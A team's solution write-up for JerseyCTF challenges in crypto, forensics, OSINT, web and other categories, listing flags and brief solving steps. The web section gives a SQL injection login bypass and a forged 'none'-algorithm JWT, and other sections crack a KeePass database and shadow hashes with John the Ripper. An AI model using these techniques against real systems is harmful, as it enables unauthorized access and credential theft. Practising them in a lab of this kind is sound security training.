# **Table of Contents**
| Categories              | Completed | Progress                                                     | Points     |
| ----------------------- | --------- | ------------------------------------------------------------ | ---------- |
| [crypto](#crypto)       | 5/9       | ![](https://us-central1-progress-markdown.cloudfunctions.net/progress/56) | 1175/2725  |
| [bin](#bin)             | 2/8       | ![](https://us-central1-progress-markdown.cloudfunctions.net/progress/25) | 600/3250   |
| [osint](#osint)         | 3/6       | ![](https://us-central1-progress-markdown.cloudfunctions.net/progress/50) | 700/1750   |
| [forensics](#forensics) | 5/7       | ![](https://us-central1-progress-markdown.cloudfunctions.net/progress/71) | 1400/1950  |
| [misc](#misc)           | 7/8       | ![](https://us-central1-progress-markdown.cloudfunctions.net/progress/88) | 1350/1750  |
| [web](#web)             | 5/7       | ![](https://us-central1-progress-markdown.cloudfunctions.net/progress/71) | 1150/1700  |
| [sponker](#sponker)     | 8/13      | ![](https://us-central1-progress-markdown.cloudfunctions.net/progress/62) | 160/260    |
| **Total**               | 35/58     | ![](https://us-central1-progress-markdown.cloudfunctions.net/progress/60) | 6535/13385 |

# **crypto**
- [salad (50)](#salad)
- [new-algorithm (75)](#new-algorithm)
- [would-you-wordle (250)](#would-you-wordle)
- [hidden-in-plain-sight (350)](#hidden-in-plain-sight)
- [file-zip-cracker (450)](#file-zip-cracker)

## **salad**

### ***Description***
- Roman generals really knew how to make salad!
- <span style="color: #e83e8c;">`atkw{plddp_jrcru_uivjjzex}`</span>


### ***Writeup***
Caesar cipher shift of 17.

Flag: `jctf{yummy_salad_dressing}`

## **new-algorithm**

### ***Description***

- On the first day of the job, a new cryptography intern is insisting to upper management that he developed a new encryption algorithm for the company to use for sensitive emails and should get a raise. This seems too good to be true... are you able to prove the intern wrong by decrypting it?
- Here's an example of an encrypted email message using the intern's algorithm: <span style="color: #e83e8c;">`amN0Znt0UllfQUVTX0lOc1QzQGR9`</span>

<details>
    <summary>View Hint</summary>
    What are some differences between encryption, encoding, and hashing?
</details>

### ***Writeup***

Base64 decode.

Flag: `jctf{tRY_AES_INsT3@d}`

## **would-you-wordle**

### ***Description***

- Someone left this secret text string and unfinished Wordle. Can you put them together to get the flag?
- pUpPHg3KfB15MG2KGtQQMDEECPOF8oa3VA==

<details>
    <summary>View Hint</summary>
    Ron's Code
</details>

[Wordle-Words.jpg](https://www.jerseyctf.site/files/9e4f94397863b790448bdf8eeddb771b/Wordle-Words.jpg?token=eyJ1c2VyX2lkIjozODgsInRlYW1faWQiOjUxMSwiZmlsZV9pZCI6MjR9.YlRzBw.2Zq5pK-TK91ofW5wbFrS9Oi5azo)

### ***Writeup***

Wordle is “thorn”. You can use any 5 letter finder like the one here: https://wordfinderx.com/wordle/.

Then use a RC4 decryption (aka Ron's cipher) with the key "thorn" to get the flag, like the oner here: https://www.howtocreate.co.uk/emails/test_RC4B64_js.htm.

Flag: `jctf{CryptoIsTheKeyToFun}`

## **hidden-in-plain-sight**

### ***Description***

- A file contains the flag but it is encrypted. Normally this would be impossible to crack, but you have the encryption algorithm source code in front of you. Try to shift through it and see the vulnerabilities that can get that flag decrypted!

<details>
    <summary>View Hint</summary>
    The file looks a little longer than you would expect.
</details>

[encrypted.pco](https://www.jerseyctf.site/files/4adc86865b2d62c34926ba5bb015c091/encrypted.pco?token=eyJ1c2VyX2lkIjozODgsInRlYW1faWQiOjUxMSwiZmlsZV9pZCI6MjJ9.YlRyaA.bifKmUpWQOC-6gxQxHf8pGuqw_A)

[encryption.py](https://www.jerseyctf.site/files/7dcacf39976161066a24293b9fd35913/encryption.py?token=eyJ1c2VyX2lkIjozODgsInRlYW1faWQiOjUxMSwiZmlsZV9pZCI6MjN9.YlRyaA.nKTTT-djO20EyX5uxoLL_54yF74)

### ***Writeup***

Reverse the AES encryption.

```python
from base64 import b64decode
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad

key = b64decode("QE1jUWZUalduWnI0dTd4IUElRCpHLUphTmRSZ1VrWHA=".encode('utf-8'))
iv = b64decode("zTnn5Yv9aHjVIhHX2BetXQ==".encode('utf-8'))
ciphered_data = b'nbXg75/acDR47Zgtho29ZVnHqFb7Ikca2SNCWj9SNNe1M+J22JxBrg94feT3anuIx2dQusjf1HJ4fRamU2xGUmHL/Sctgx0ZOsSbIyuksblsjNPmajhzTpljIY0ztR/f6LH5Iq6XJ3MjpTnp4wNg4ODQXfgjyc+UPfk91le4/zIFyAMISCskjw1OYGAOHoS5'
cipher = AES.new(key, AES.MODE_CBC, iv=iv)
original_data = cipher.decrypt(b64decode(ciphered_data))
print(original_data)
```

Flag: `jctf{CryptoIsTheKeyToFun}`

## **file-zip-cracker**

### ***Description***

- We have a secret file that is password protected. However, we have obtained a wordlist of actors that is part of the password. The password is the combination of one of the names on the list with a year.
- **Format**: "Actor_NameYYYY" **Example**: "Henry_Cavill1964"
- Fix the script to brute force the password.

[actorList.txt](https://www.jerseyctf.site/files/a375d21bafaf6d09c841e5a52d18dcc2/actorList.txt?token=eyJ1c2VyX2lkIjozODgsInRlYW1faWQiOjUxMSwiZmlsZV9pZCI6MjV9.YlR0Cg.hqcogEop_PKiTQAlL_-34ek53O0)

[FileZipCracker_Challenge_Version.py](https://www.jerseyctf.site/files/25785216f98fbf26c525f6045099b2a6/FileZipCracker_Challenge_Version.py?token=eyJ1c2VyX2lkIjozODgsInRlYW1faWQiOjUxMSwiZmlsZV9pZCI6MjZ9.YlR0Cg.J7clsEBT1gfSnnPJbYyT0ZKg7lg)

[secret_folder.zip](https://www.jerseyctf.site/files/29d964bd6ef2680db85a65d701945900/secret_folder.zip?token=eyJ1c2VyX2lkIjozODgsInRlYW1faWQiOjUxMSwiZmlsZV9pZCI6Mjd9.YlR0Cg.W9lzEoUc_iASDC_hzwm3uwr7F-A)

### ***Writeup***

Brute force using a python script. Caesar cipher to decode the key. Run `file` and change file type to .gif.

Flag: `jctf{ew8WhHuhmv}`

# **bin**

- [misdirection (250)](#misdirection)
- [going-over (350)](#going-over)

## **misdirection**

### ***Description***

Where'd the flag go?

<details>
    <summary>View Hint</summary>
    There are many ways to solve this challenge, some of which are much easier than others.
</details>

[misdirection](https://www.jerseyctf.site/files/3eadc1906cef0acc4030cb7a9afa3ea2/misdirection?token=eyJ1c2VyX2lkIjozODgsInRlYW1faWQiOjUxMSwiZmlsZV9pZCI6MzF9.YlR4EQ.XKV_izbjw9xvfblun3io4A9Ry0w)

### ***Writeup***

![img](https://lh6.googleusercontent.com/dejQOwGP9W-J6-ZTmAl8cnInzoFDXmskqJ9CHTcNX1HSitcU1_8pHPsvGiYvSjeKEtwGBc69aSShyad7kU1pzJo7yCgiKAO5WGEiRZNuPs5dBYaI88C6mZJHkY5_hjNWPWFGPK5k)

Examine program in ghidra and notice it only contains one function. Buf1 is our target. Set a breakpoint at write in GDB and examine the value of the register containing buf1 (%rsi).

![img](https://lh4.googleusercontent.com/OOM36OUFV1U7TH2-PQ4pT-B5sQ5Te2Bz0CnUaFiD21yxQHCfcFS8wr7y2bjHLMGNIu29ef6hE5tA4i-2u0-sDGW00BVieN8lEmNqIHKglypKRbdkpaPtmOiSPnvTHGvTq4s46u_6)

![img](https://lh4.googleusercontent.com/bMTd_phCMUFuRqfpsKOma88qTiJqv_2XASGVs6KIakpLQCRaMyJVfOARRXAquyt3WW-w526J_pZ3EZlhb0SVRThKdi4W-YUw4Vgg5FZ67PidbAOlSqmvXqMTqsCTezj-cG0oI9kQ)

![img](https://lh6.googleusercontent.com/NfoB-sj63uQk5m6_5F3dB0fjPMvo8rlodFREnwAjm9xHUKLeKBRhrcoJBvK9dtnJcunvEUScSdX5xi9m2cJPBxl-tLiUx3i4uVI0ARptJlsBpcdb3SnOOGE2MJwxIXvztXceOrUS)

Flag: `jctf{l00k5_1ik3_u_f0Und_m3_018a09d6}`

## **going-over**

### ***Description***

- My friends said they were going on a trip but I think they ran into some trouble...
- They sent me these two files before we lost contact (**src.c** and **going-over**)

<span style="color: #e83e8c;">nc 0.cloud.chals.io 10197</span>

<details>
    <summary>View Hint</summary>
    If only there were a way to find the exact location of the ledge... like if the ledge had an address or something
</details>

[going-over](https://www.jerseyctf.site/files/294adfee89ff8062305c35796b90b97e/going-over?token=eyJ1c2VyX2lkIjozODgsInRlYW1faWQiOjUxMSwiZmlsZV9pZCI6MzN9.YlR40Q.f-2IiuCiVZ-JOVxpKQ-BVa4GUsU)

[src.c](https://www.jerseyctf.site/files/a55cf2daca28047e9932cf984c7d6fae/src.c?token=eyJ1c2VyX2lkIjozODgsInRlYW1faWQiOjUxMSwiZmlsZV9pZCI6MzR9.YlR40Q.vCGi5mXxagmbVfsN-Y7k9LbTNFc)

### ***Writeup***

![img](https://lh6.googleusercontent.com/m6MWpDpnY8FiKuoCRR7m0svxvvWKnquvaQfza4-lIV42QTz8KNAo7aga-YUF81eEfVvbtiFLQX4k5MZqb69q1UvC-kTzCymeNo-wub1288uzlpnoYgI3IhzbOtuduSDlSNnQY3jd)

# **osint**

- [dns-joke (100)](#dns-joke)
- [photo-op-spot (250)](#photo-op-spot)
- [rarity (350)](#rarity)

## **dns-joke**

### ***Description***

- A system administrator hasn't smiled in days. Legend has it, there is a DNS joke hidden somewhere in [www.jerseyctf.com](http://www.jerseyctf.com/). Can you help us find it to make our system administrator laugh?

<details>
    <summary>View Hint</summary>
    How are IP addresses pointed towards domain names?
</details>

### ***Writeup***

Use DNS lookup tool on https://www.jerseyctf.com/.

Flag: `jctf{DNS_J0k3s_t@k3_24_hrs}`

## **photo-op-shot**

### ***Description***

- In three words tell me where I stood when I grabbed this picture.
- Solution format: jctf{yourthreewords} - no special characters

<details>
    <summary>View Hint</summary>
    GPS coordinates aren't the only method of specifying a location.
</details>

[photo-op-shot.JPG](https://www.jerseyctf.site/files/6ff5e1564d4137f5d48463aedb8e5632/photo-op-spot.JPG?token=eyJ1c2VyX2lkIjozODgsInRlYW1faWQiOjUxMSwiZmlsZV9pZCI6NDB9.YlR90A.K0YFsNi4Ihmwgz69ZbnR1DWQs-E)

### ***Writeup***

Radio tower is called “Transforest” after doing some Google image searching.

We want to specify the location with just three words, which we can use https://what3words.com and give the address “130 Minor Ave N”.

Flag: `jctf{solofadesbrief}`

## **rarity**

### ***Description***

- With three belonging to a respective company, there is only a two-digit number amount of this entity left in the world. There is one near this picture... how close can you get to it?
- The flag format is the coordinates in decimal degrees notation, for example: <span style="color: #e83e8c;">`jctf{-65.913734,-10.814140}`</span>
- Get the coordinates **at the gate**

<details>
    <summary>View Hint</summary>
    Aren't sub sandwiches great?
</details>

<details>
    <summary>View Hint</summary>
    <a href="https://en.wikipedia.org/wiki/Hindenburg_disaster">https://en.wikipedia.org/wiki/Hindenburg_disaster</a>
</details>

[picture.png](https://www.jerseyctf.site/files/4133210b82b0c48fc842bee2a7ab7fee/picture.png?token=eyJ1c2VyX2lkIjozODgsInRlYW1faWQiOjUxMSwiZmlsZV9pZCI6NDF9.YlSBiA.AIUYELs0qMedI9HnhxsrEjieKoM)

### ***Writeup***

The entity is a Blimp, more specifically a Goodyear blimp. The gate must near the Wingfoot Lake base in Akron, OH given the 330 area code in the bottom right.

The address is 1012 Goodyear Park.

Flag: `jctf{41.0198897,-81.3621548}`

# **forensics**

- [speedy-at-midi (150)](#speedy-at-midi)
- [data-backup (250)](#data-backup)
- [recent-memory (250)](#recent-memory)
- [scavenger-hunt (350)](#scavenger-hunt)
- [corrupted-file (400)](#corrupted-file)

## **speedy-at-midi**

### ***Description***

- Your partner-in-crime gets a hold of a MIDI file, <span style="color: #e83e8c;">`riff.mid`</span>, which intelligence officials claim to contain confidential information. He has tried opening it in VLC Media Player, but it sounds just like the piano riff in <span style="color: #e83e8c;">`riff.mp3`</span>. Can you find the right tool to extract the hidden data?

<details>
    <summary>View Hint</summary>
    You wouldn't have the audacity to try using a MIDI editor, would you?
</details>

[riff.mid](https://www.jerseyctf.site/files/531056bf3e98adcbda54f68023e70622/riff.mid?token=eyJ1c2VyX2lkIjozODgsInRlYW1faWQiOjUxMSwiZmlsZV9pZCI6MTh9.YlSYQw.eFW82LKkVc_JmmuGGQn26vtAB-g)

[riff.mp3](https://www.jerseyctf.site/files/965ce2c09022315db0136ea155068369/riff.mp3?token=eyJ1c2VyX2lkIjozODgsInRlYW1faWQiOjUxMSwiZmlsZV9pZCI6MTl9.YlSYQw.BxS2VCX1G1Z66IoAEuBZs1Z1RCE)

### ***Writeup***

![img](https://lh4.googleusercontent.com/wLAEp2VN2C_XtRQIwjy5iuK5qnlExrZAy22gKd7oxotvxTEsIkOU3G43EeaPa6iVD8PG6z_iw1vaZfbiWvSgP1LZBmcc2QyuFboAS2haAqI4DZ389RqCsVEbbzBnc2SjfnWYHtms)

Flag: `jctf{kicking_it_since_1983}`

## **data-backup**

### ***Description***

- The backup of our data was somehow corrupted. Recover the data and be rewarded with a flag.

<details>
    <summary>View Hint</summary>
    Try a tool a surgeon might use.
</details>

[data-backup](https://www.jerseyctf.site/files/6953c4156b0de04c42e0a32c7e56b2f1/data-backup?token=eyJ1c2VyX2lkIjozODgsInRlYW1faWQiOjUxMSwiZmlsZV9pZCI6MzB9.YlSZ6w.oQ-_d4EhvMDDvB0DyZLDa2PJYGA)

### ***Writeup***

Run `bulk_extractor -f jctf -o output <filename>` and open the file that it outputted.

Flag: `jctf{fun_w17h_m461c_by735}`

## **recent-memory**

### ***Description***

- Use the memory image in the Google drive link below. An attacker left behind some evidence in the network connections. Follow the attacker's tracks to find the flag.
- https://drive.google.com/drive/folders/1ubSx3pwHOSZ9oCShHBPToVdHjTev7hXL
- Backup link if the above link is not working: https://drive.google.com/drive/folders/192ELa6W5OZyeWi3DlRd-_TndzN2p_Xz8?usp=sharing

<details>
    <summary>View Hint</summary>
    Try connecting to the attacker's system.
</details>

### ***Writeup***

`strings recent-memory.mem | grep -i jctf`

Flag: `jctf{f0ll0w_7h3_7r41l}`

## **scavenger-hunt**

### ***Description***

- My friend told me he hid a flag for me on this server! Server: 0.cloud.chals.io SSH port: 24052
- **Username**: *jersey*
- **Password**: *securepassword*

<details>
    <summary>View Hint</summary>
    <ul>
        <li>If only there were a way to see all folders... even hidden ones</li>
        <li>I wonder where passwords are typically stored on ssh servers</li>
    </ul>
</details>

### ***Writeup***

Hint implies to look for the password files. Here a suspicious package file was located. Go to this package’s installation using `dpkg -L <packagename>` and access its manual page to find the key.

Flag: `jctf{f0ll0w_7h3_7r41l}`

## **corrupted-file**

### ***Description***

- Can you find a way to fix our corrupted .jpg file?

[flag_mod.jpg](https://www.jerseyctf.site/files/24b8f40b32450724de98144a7bbf2aa9/flag_mod.jpg?token=eyJ1c2VyX2lkIjozODgsInRlYW1faWQiOjUxMSwiZmlsZV9pZCI6NDd9.YlYF7A.Gbn7b_YfNVOL3uXVKmj2uiWlwSg)


### ***Writeup***

Use a hex editor and change the first 6 bytes so that it starts with **FF D8 FF**.

# **misc**

- [firewall-rules (100)](#firewall-rules)
- [snort-log (100)](#snort-log)
- [we-will (150)](#we-will)
- [filtered-feeders (150)](#filtered-feeders)
- [bank-clients (250)](#bank-clients)
- [dnsmasq-ip-extract (300)](#dnsmasq-ip-extract)
- [check-the-shadows (300)](#check-the-shadows)

## **firewall-rules**

### ***Description***

Liar, Liar, Rules on Fire!

- A network administrator configured a device's firewall, but made a few errors along the way. Some of your favorite applications may have been denied... We can't worry about that yet, first step is to make sure external hosts aren't able to exploit vulnerable firewall rules.
- Add the vulnerable ports and put the answer in the flag format: jctf{INSERT NUMBER}

<details>
    <summary>View Hint</summary>
    <ul>
        <li>Sometimes Google searches lead to numbers!</li>
        <li>Focus on remote access.</li>
    </ul>
</details>

[firewall_rules.xlsx](https://www.jerseyctf.site/files/dd22d385f2ac0c45827dffaa30bdb8cf/firewall_rules.xlsx?token=eyJ1c2VyX2lkIjozODgsInRlYW1faWQiOjUxMSwiZmlsZV9pZCI6MTB9.YlYepg.ZKHjfuTsOvf_U-dzBeU-8YPIXQQ)


### ***Writeup***

3 ports facilitate remote control: 513 (login), 3389 (RDP), 23 (Telnet).

Flag: `jctf{3925}`

## **snort-log**

### ***Description***

- Let's just say: we are absolutely screwed. The company network administrator recently deployed Snort on our network and immediately received 575 alerts in the log file. To put it lightly, every attack out there is infecting the network. Did you take the required Information Security training? Anyways, the company is going to file for bankruptcy because of this :(. We might as well do SOMETHING so that we can get hired elsewhere. The network administrator mentions to you that after finishing reviewing the log file, she also noticed the web server CPU load and memory usage were abnormally high. Also, what's up with all of this network traffic? Manual analysis stinks, but let's find out what this attack is and take action...
- Put your answer in the flag format: jctf{INSERT STRING}

<details>
    <summary>View Hint</summary>
	Seems like the extra network traffic is primarily inbound, not outbound.
</details>

[snort.log](https://www.jerseyctf.site/files/bf90c7b6de072c414592a446f9c097e6/snort.log?token=eyJ1c2VyX2lkIjozODgsInRlYW1faWQiOjUxMSwiZmlsZV9pZCI6MTF9.YlYfFw.rdxy2v1im6gwCymzv7jiRKJT53s)


### ***Writeup***

<kbd>Ctrl+F</kbd> for ddos.

Flag: `jctf{aut0m@t1on1sb3tt3r}`

## **we-will**

### ***Description***

- A flag was left behind but it seems to be protected.

<details>
    <summary>View Hint</summary>
	The challenge name should help you figure out how to open it.
</details>

[flag.zip](https://www.jerseyctf.site/files/77f8036d0c1b0762c3b0d2afc8e6f430/flag.zip?token=eyJ1c2VyX2lkIjozODgsInRlYW1faWQiOjUxMSwiZmlsZV9pZCI6MTJ9.YlYfcQ.UMmghuK-xXKlHKr9nF03rtyiPSM)


### ***Writeup***

Use John the Ripper

## **filtered-feeders**

### ***Description***

- The fishing net caught plenty of herrings, but the flag is nowhere to be found! Try to find the flag within the pile of fish.

<details>
    <summary>View Hint</summary>
	How do you hide an image within an image?
</details>

[herrings.png](https://www.jerseyctf.site/files/cdc4c88c5fe2dcec4c015fbd4ce00b04/herrings.png?token=eyJ1c2VyX2lkIjozODgsInRlYW1faWQiOjUxMSwiZmlsZV9pZCI6NDh9.YlYgmA.hMNHkRd1Ln2P-QaRPcZ6dPYUX5o)


### ***Writeup***

Steganography: https://www.aperisolve.fr/6688b126065a80999b3b23bd945920ee

![img](https://lh4.googleusercontent.com/zdZDYEDTHqcInslK2_wcsYRDrz_B3rPl4gnU_dBpLOLW6Hff0t0RqLJfAJMcxWEF17A2wPxeYPtK-2MDaU2tUEx6om2e29qWkjXSYi3UUHpmFrbutQ4tF45DpW-CwmmNWv8T9qTa)

Flag: `jctf{1_l0v3_h3rr1n6S}`

## **bank-clients**

### ***Description***

- While in Rome, a few heisters spotted a computer in the dumpster outside of a bank and took it. After brute forcing the computer credentials and getting in with "admin/password", there was a password-protected client database discovered. A Desktop sticky note had the following information: "To fellow bank employee - a way to remember each database PIN is that it is 4-digits ranging between 1000 and 9999". It appears the sticky note was auto-translating from another language as well - let's turn that off. Are you able to assist the heisters from here?

<details>
    <summary>View Hint</summary>
	After scrolling down, there was additional text on the Desktop sticky note that says "wyptbt lza zlwalt". These bank employees should be removed from the payroll immediately...
</details>

[clients.kdbx](https://www.jerseyctf.site/files/b481bc3e54674061dae64b54c17d8d8f/clients.kdbx?token=eyJ1c2VyX2lkIjozODgsInRlYW1faWQiOjUxMSwiZmlsZV9pZCI6MTR9.YlYhOA.HkJVISPZQxwI6fFdXBbbu6D33Ms)


### ***Writeup***

From the prompt it is known that the decryption key is a four-digit number. The hint reveals that the first digit is 7, resulting in 999 potential candidates from 7000 to 7999. Using `keepass2john clients.kdbx > dbpasshash.txt` gives the hashed password, and then generating a text file of numbers from 7000-7999 and running `john --wordlist=passwd.txt dbpasshash.txt`.

![img](https://lh4.googleusercontent.com/t6BywuHEGlICZB4DbrzaEOqn6OXptsYarIOey-oFSxgzDPkwZHKeF12Z60RGpyJcE3lOCzuv1zk3t_rR65rSqYM8p6u7oGE_28FmK_gBHlS9gW_2QtQ_UkGzuwEFV2WKysWEXQhF)

Flag: `jctf{R1ch_p3rson_#4}`

## **dnsmasq-ip-extract**

### ***Description***

- Extract all **unique** IPs from *dnsmasq-ip-extract-dnsmasq.log*, hash each IP (SHA256), and write the IP + hash to a text file (IP and hash should be separated by a space, and each IP + hash entry should be on a new line).
- **NOTE:** Alphabetical characters in the hash should be lower case, as seen in example below. Otherwise, your flag will be incorrect!
- Example of text file output contents: <span style="color: #e83e8c;">`10.59.78.165 a6dd519bf8c7c50df5ae519963b5cf1590a471f88343c603168645ff335b26fe` `10.244.220.245 20657ea410e8dd2dbf979a12fea35dd1b94beb6c2cac34f1d49c5824d03de5a1` `10.18.47.24 c0e481d8f55dbb7de078cdcf67ebf627dc371e969e7dbb0b93afcce104e9247e`</span>
- The flag is the SHA256 hash of the output file. Example: <span style="color: #e83e8c;">`jctf{138706baa74bac72c8ee1c42eb3a7c6add2f71c0737c5044dcdd9cba7409ead6}`</span>

<details>
    <summary>View Hint</summary>
	Verify that the end of your file has a new blank line.
</details>

[dnsmasq-ip-extract-dnsmasq.log](https://www.jerseyctf.site/files/a5aac2ffca9051699b1d079152166ee4/dnsmasq-ip-extract-dnsmasq.log?token=eyJ1c2VyX2lkIjozODgsInRlYW1faWQiOjUxMSwiZmlsZV9pZCI6MTV9.YlYhYQ.UAL0z5g3G7znVN_t2abSQcdt66E)


### ***Writeup***

Use uniq.

## **check-the-shadows**

### ***Description***

- Someone in operations recovered fragments of an important file from 142.93.56.4 when it was undergoing maintenance. Intel has it that one of the users has some valuable information. SSH into the server and retrieve it.

<details>
    <summary>View Hint</summary>
	John once said that "any group is only as strong as the weakest link."
</details>

[shadow](https://www.jerseyctf.site/files/2af5efc7bf1e8ad255d42110b62c1a6d/shadow?token=eyJ1c2VyX2lkIjozODgsInRlYW1faWQiOjUxMSwiZmlsZV9pZCI6MzJ9.YlYipA.P13rhxhSG5rT-JTiOVhqUJsXiAM)


### ***Writeup***

Used john the ripper to get get the user/pass from the hash file

`grep -r jctf` to find the flag

Flag: `jctf{o_noes_dicTionarY_atk}`

# **web**

- [apache-logs (100)](#apache-logs)
- [seigwards-secrets (100)](#seigwards-secrets)
- [heres-my-password(250)](#heres-my-password)
- [flag-vault (300)](#flag-vault)
- [cookie-factory (400)](#cookie-factory)

## **apache-logs**

### ***Description***

- An apache log file that contains recent traffic was pulled from a web server. There is suspicion that an external host was able to access a sensitive file accidentally placed in one of the company website's directories. Someone's getting fired...
- Identify the source IP address that was able to access the file by using the flag format: jctf{IP address}

<details>
    <summary>View Hint</summary>
	Which directory types should sensitive files not be placed in?
</details>

[webtraffic.log](https://www.jerseyctf.site/files/3a0428612620ef7b190032655f097b00/webtraffic.log?token=eyJ1c2VyX2lkIjozODgsInRlYW1faWQiOjUxMSwiZmlsZV9pZCI6OH0.YlYjVw.k0472hBVgZ8pNS9aLHisdMszles)


### ***Writeup***

<kbd>CTRL+F</kbd> for 200 (successful HTTP GETs), the one indicating bank records represents confidential data and is what we are searching for.

Flag: `jctf{76.190.52.148}`

## **seigwards-secrets**

### ***Description***

- Seigward has been storing his secrets on his website [https://jerseyctf.co](https://jerseyctf.co/) for decades. Hasn't failed him yet.

<details>
    <summary>View Hint</summary>
	Where can you find a website's code?
</details>


### ***Writeup***

Notice that the [login.js](https://jerseyctf.co/login.js) file checks if the password when converted from ascii to base64 (`btoa`) is equal to `amN0ZnsxTV9zMF8xTV81b19EeW40TWl0M18wOTI0Nzh9`. Use a base64 decoder.

Flag: `jctf{1M_s0_1M_5o_Dyn4Mit3_092478}`

## **heres-my-password**

### ***Description***

- Here's the deal - we have a list of 500 users (males, females, and pets) and one password. Log-in with the proper credentials for the flag.
- The password is **lightswitchon_and_offLOL26** and the website is [www.jerseyctf.online](http://www.jerseyctf.online/).

<details>
    <summary>View Hint</summary>
	This is not intended to require manual brute force. What are some other types of brute force methods?
</details>

[users.txt](https://www.jerseyctf.site/files/b75ea9a239df8ec1408edc31d05932b3/users.txt?token=eyJ1c2VyX2lkIjozODgsInRlYW1faWQiOjUxMSwiZmlsZV9pZCI6OX0.YlYlAg.llQS13U44BZu_MnEALyBwcMWvUM)


### ***Writeup***

The username changes every minute.

Flag: `jctf{c0NGR@T2_y0U_p@22wORd_SPR@y3D!}`

## **flag-vault**

### ***Description***

- I'm very organized. I even keep all of my flags neatly organized in a database! But, these are my flags! You don't have access to them... or do you?
- Do not brute force this challenge.

<span style="color: #e83e8c;">Start here: jerseyctf-flag-vault.chals.io</span>

<details>
    <summary>View Hint</summary>
	<ul>
        <li>What is the most common type of database?</li>
        <li>What is the flag format? How does that help you?</li>
    </ul>
</details>


### ***Writeup***

Login initially with the username `admin` and password `' OR 1=1--` Then give the SQL query `' OR FLAG LIKE 'jctf{%' --` which will search for all entries that match the jctf beginning characters.

![img](https://lh6.googleusercontent.com/ja4PP1_ChvlZ_ZBTZzZRPJfNMkGjQaUdq0HuB3v4DM79-Rx3N8mNMFIvV7FadYpISUnfuEu7Eg8GZ-6NCsGRtUWW2b_Wb4dQzpPjBaGwQY4LLJXTX8nW9rnw9MSBtKfrXxFQstJI)

Flag: `jctf{ALMOST_LIKE_A_NEEDLE_IN_A_HAYSTACK}`

## **cookie-factory**

### ***Description***

Granny's Cookie Factory

- Here at Granny's Old-Fashioned Home-Baked Cookie Factory, we pride ourselves on our cookies AND security being the best in the business.

<span style="color: #e83e8c;">Start here: https://jerseyctf-cookie-factory.chals.io/</span>


### ***Writeup***

CVE-2018-1000531 vulnerability.

Username as “a” and password as “b” generates this JWT token: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImEifQ.I2_0Uq0TSXDKY8C13D_0yk8mLcZP_0RPy_I2KNwXBO8`, which is in base64

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9` → `{"typ":"JWT","alg":"HS256"}`

`eyJ1c2VybmFtZSI6ImEifQ` → `{"username":"a"}`

`I2_0Uq0TSXDKY8C13D_0yk8mLcZP_0RPy_I2KNwXBO8` → some random bytes

We want to generate a new custom token with a none algorithm.

`{"typ":"JWT","alg":"none"}` → `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0`

`{"username":"admin"}` → `eyJ1c2VybmFtZSI6ImFkbWluIn0`

We can leave the password as blank so our token ends with a `.`

Payload: `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.`

![img](https://lh6.googleusercontent.com/ViZ8ru4mHheTDwGxymv74V5D00ieb_qxKYeYDKFZe3Rjpsss75UIC8DPp9AmmZDZW7J_DDAySBEXagayMfNhzVDKpWKfvPUECFfkIakzjXjGPzu0XH7XhIyECOM76AOhgBHZ9BBI)

Flag: `jctf{GEEZ_WHAT_A_TOUGH_COOKIE}`

# **sponker**

- [x] [brian (20)](#brian)
- [x] [jon (20)](#jon)
- [x] [kevin (20)](#kevin)
- [x] [pinky/eric (20)](#pinkyeric)
- [x] [pat/eremaine/joe (20)](#patjeremainejoe )
- [x] [njccic (20)](#njccic)
- [x] [frsecure (20)](#frsecure)
- [ ] [google (20)](#google)
- [x] [palo alto networks (20)](#palo-alto-networks)
- [ ] [crowdstrike (20)](#crowdstrike)
- [ ] [feedback (20)](#feedback)

## **brian**

### ***Description***

**Connect with NJCCIC**: *Website*: [https://cyber.nj.gov](https://cyber.nj.gov/)


### ***Writeup***

## **jon**

### ***Description***

Heisters can attend tech talks to refine their bank (cyber)security skills.

### ***Writeup***

https://youtu.be/TuJAMPkPMc8?t=2230

Flag: `jctf{couch_light_pencil}`

## **kevin**

### ***Description***

Heisters can attend tech talks to refine their bank (cyber)security skills.

### ***Writeup***

https://youtu.be/fx1pwiVQN-Y?t=1582

Flag: `jctf{icCDdOIDW0}`

## **pinky/eric**

### ***Description***

Heisters can attend tech talks to refine their bank (cyber)security skills.

### ***Writeup***

https://youtu.be/vLHOU847GxA?t=3945

Flag: `jctf{plane_bowl_mouse}`

## **pat/jermaine/joe**

### ***Description***

Heisters can attend tech talks to refine their bank (cyber)security skills.

### ***Writeup***

https://youtu.be/whpS3K2k67U?t=2652

Flag: `jctf{78POYdCGzf}`

## **njccic**

### ***Description***

**Connect with NJCCIC**: *Website*: [https://cyber.nj.gov](https://cyber.nj.gov/)


### ***Writeup***

Flag: `jctf{pr0t3ct_NJ_cyb3r_sp@C3}`

## **frsecure**

### ***Description***

**Connect with FRSecure:** *Website*: https://frsecure.com/


### ***Writeup***

Flag: `jctf{inf0rmation_SECURITY_#1}`

## **google**

### ***Description***

**Connect with Google:** *Website*: https://cloud.google.com/


### ***Writeup***

Flag: `jctf{z3r0_trust_infr@structure}`

## **palo alto networks**

### ***Description***

**Connect with Palo Alto Networks:** *Website*: https://www.paloaltonetworks.com/


### ***Writeup***

Flag: `jctf{gl0b@l_cyb3rSECurity_l3@der}`

## **crowdstrike**

### ***Description***

**Connect with CrowdStrike:** *Website*: https://www.crowdstrike.com/


### ***Writeup***

Flag: `jctf{br3aches_stop_HERE!}`

## **feedback**

### ***Description***

On Sunday, the JerseyCTF Feedback Google Form will be released on the Discord #announcements text channel. Fill out this feedback form for a flag in the confirmation message!


### ***Writeup***

Flag: `jctf{tH@nks_for_aTTending_PART2!}`